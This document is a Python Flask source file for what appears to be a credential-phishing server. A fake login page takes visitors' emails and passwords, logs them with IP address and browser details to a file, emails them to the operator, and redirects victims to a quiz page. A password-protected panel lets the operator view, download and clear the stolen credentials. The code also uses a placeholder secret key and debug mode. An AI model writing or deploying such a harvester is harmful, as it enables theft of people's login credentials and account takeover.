from flask import Flask, render_template, request, redirect, url_for, session, send_file
from datetime import datetime, timedelta
import os
from send_mail import send_email_alert
from config import LOGIN_PASSWORD

app = Flask(__name__)
app.secret_key = 'your_secret_key'
app.permanent_session_lifetime = timedelta(minutes=10)  # auto-logout after 10 mins

# ---------- ROUTES ---------- #

@app.route('/')
def login():
    return render_template('login.html')


@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Truncate log file if too large (>5MB)
    if os.path.exists("captured_log.txt") and os.path.getsize("captured_log.txt") > 5 * 1024 * 1024:
        open("captured_log.txt", "w").close()

    log_entry = f"[{timestamp}] IP: {ip_address} | Email: {email} | Password: {password} | User-Agent: {user_agent}\n"

    with open('captured_log.txt', 'a') as f:
        f.write(log_entry)

    send_email_alert(email, password)
    session['email'] = email

    return redirect('/quiz')


@app.route('/quiz')
def quiz():
    email = session.get('email', 'Unknown')
    return render_template('quiz.html', email=email)


@app.route('/auth', methods=['GET', 'POST'])
def auth():
    error = None
    if request.method == 'POST':
        if request.form.get('password') == LOGIN_PASSWORD:
            session['authenticated'] = True
            session.permanent = True
            return redirect(url_for('view_logs'))
        else:
            error = "Incorrect password."
    return render_template('auth.html', error=error)



@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('auth'))



@app.route('/view-logs')
def view_logs():
    if not session.get('authenticated'):
        return redirect(url_for('auth'))

    logs = []
    if os.path.exists("captured_log.txt"):
        with open("captured_log.txt", 'r') as f:
            logs = f.readlines()

    return render_template('logs.html', logs=logs)


@app.route('/logs-fragment')
def logs_fragment():
    if not session.get('authenticated'):
        return "Unauthorized", 401

    logs = []
    if os.path.exists("captured_log.txt"):
        with open("captured_log.txt", 'r') as f:
            logs = f.readlines()

    return render_template('logs_fragment.html', logs=logs)


@app.route('/download-logs')
def download_logs():
    if not session.get('authenticated'):
        return redirect(url_for('auth'))

    if os.path.exists("captured_log.txt"):
        return send_file("captured_log.txt", as_attachment=True)
    return "No logs to download."


@app.route('/clear-logs')
def clear_logs():
    if not session.get('authenticated'):
        return redirect(url_for('auth'))

    open("captured_log.txt", "w").close()
    return redirect(url_for('view_logs'))


if __name__ == '__main__':
    app.run(debug=True)
